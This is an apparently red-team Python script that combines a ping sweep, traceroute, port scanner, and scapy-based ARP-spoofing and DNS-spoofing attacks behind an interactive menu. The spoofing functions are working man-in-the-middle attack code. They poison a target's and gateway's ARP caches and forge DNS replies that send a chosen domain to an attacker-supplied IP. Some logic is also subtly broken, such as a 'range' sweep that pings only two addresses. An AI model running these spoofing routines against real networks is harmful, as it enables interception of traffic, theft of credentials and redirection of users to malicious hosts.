# red_python_scripts_combined.py

import subprocess
import socket
import os
import time
import sys
from scapy.all import *

def ping_sweep(ip_range):
    """
    Perform a ping sweep on a given IP range.
    """
    for ip in ip_range:
        response = os.popen(f"ping -c 1 {ip}").read()
        if "1 received" in response:
            print(f"{ip} is up")
        else:
            print(f"{ip} is down")

def traceroute(target_ip):
    """
    Perform a traceroute to a target IP.
    """
    try:
        print(f"Traceroute to {target_ip}:")
        subprocess.run(["traceroute", target_ip], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error during traceroute: {e}")

def port_scan(target_ip, ports):
    """
    Scan specified ports on a target IP.
    """
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            print(f"Port {port} is open")
        else:
            print(f"Port {port} is closed")
        sock.close()

def arp_spoof(target_ip, gateway_ip, interface):
    """
    Perform ARP spoofing on a target IP and gateway IP.
    """
    try:
        while True:
            # Send ARP response to target IP
            send(ARP(op=2, psrc=gateway_ip, pdst=target_ip), iface=interface)
            # Send ARP response to gateway IP
            send(ARP(op=2, psrc=target_ip, pdst=gateway_ip), iface=interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")

def dns_spoof(domain, fake_ip, interface):
    """
    Perform DNS spoofing for a specified domain.
    """
    try:
        while True:
            packet = sniff(filter=f"udp and dst port 53", iface=interface, count=1, timeout=5)
            for p in packet:
                if DNS in p and p[DNS].qr == 0 and p[DNS].qd.qname.decode() == domain:
                    spoofed_packet = IP(dst=p[IP].src, src=p[IP].dst) / UDP(dport=p[UDP].sport, sport=p[UDP].dport) / DNS(id=p[DNS].id, qr=1, aa=1, qd=p[DNS].qd, an=DNSRR(rrname=p[DNS].qd.qname, type='A', rdata=fake_ip, ttl=10))
                    send(spoofed_packet, iface=interface)
                    print(f"Spoofed {domain} to {fake_ip}")
    except KeyboardInterrupt:
        print("DNS spoofing stopped.")

def main():
    while True:
        print("\nMenu:")
        print("1. Ping Sweep")
        print("2. Traceroute")
        print("3. Port Scan")
        print("4. ARP Spoofing")
        print("5. DNS Spoofing")
        print("6. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            ip_range = input("Enter IP range (e.g., 192.168.1.1-254): ").split('-')
            ping_sweep(ip_range)
        elif choice == '2':
            target_ip = input("Enter target IP: ")
            traceroute(target_ip)
        elif choice == '3':
            target_ip = input("Enter target IP: ")
            ports = list(map(int, input("Enter ports to scan (comma-separated): ").split(',')))
            port_scan(target_ip, ports)
        elif choice == '4':
            target_ip = input("Enter target IP: ")
            gateway_ip = input("Enter gateway IP: ")
            interface = input("Enter network interface (e.g., eth0): ")
            arp_spoof(target_ip, gateway_ip, interface)
        elif choice == '5':
            domain = input("Enter domain to spoof: ")
            fake_ip = input("Enter fake IP: ")
            interface = input("Enter network interface (e.g., eth0): ")
            dns_spoof(domain, fake_ip, interface)
        elif choice == '6':
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid choice. Please try again.")

if __name__ == '__main__':
    main()
